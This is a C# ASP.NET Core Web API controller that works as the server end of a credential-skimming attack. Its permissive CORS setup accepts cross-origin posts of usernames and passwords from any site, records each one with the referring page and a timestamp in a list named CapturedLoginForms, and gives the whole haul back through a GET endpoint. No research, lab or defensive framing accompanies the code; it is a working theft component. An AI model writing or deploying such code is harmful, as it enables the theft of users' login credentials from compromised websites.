using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json.Linq;

// For more information on enabling Web API for empty projects, visit https://go.microsoft.com/fwlink/?LinkID=397860

namespace ScriptsDomain
{
    [Route("api/[controller]")]
    public class LoginData : Controller
    {
        public class LoginAttempt
        {
            public string username { get; set; }
            public string password { get; set; }
            public string referrer { get; set; }
            public DateTime timeStamp { get; set; }
        }

        private static readonly List<LoginAttempt> CapturedLoginForms = new List<LoginAttempt>();

        [HttpOptions]
        public void Options()
        {
            if (Request.Headers.TryGetValue("origin", out var values))
            {
                Response.Headers["Access-Control-Allow-Origin"] = values[0];
            }
            else
            {
                Response.Headers["Access-Control-Allow-Origin"] = "*";
            }

            Response.Headers["Access-Control-Allow-Methods"] = "POST, GET, OPTIONS";
            Response.Headers["Access-Control-Allow-Headers"] = "Content-Type";
            Response.Headers["Access-Control-Max-Age"] = "60";
        }

        // GET: api/logindata
        [HttpGet]
        public JsonResult Get()
        {
            return new JsonResult(CapturedLoginForms);
        }

        // POST api/logindata
        [HttpPost]
        public void Post([FromBody]LoginAttempt formData)
        {
            formData.referrer = Request.Headers["Referer"];
            formData.timeStamp = DateTime.Now;
            CapturedLoginForms.Add(formData);

            Response.Headers["Access-Control-Allow-Origin"] = "*";
        }
    }
}
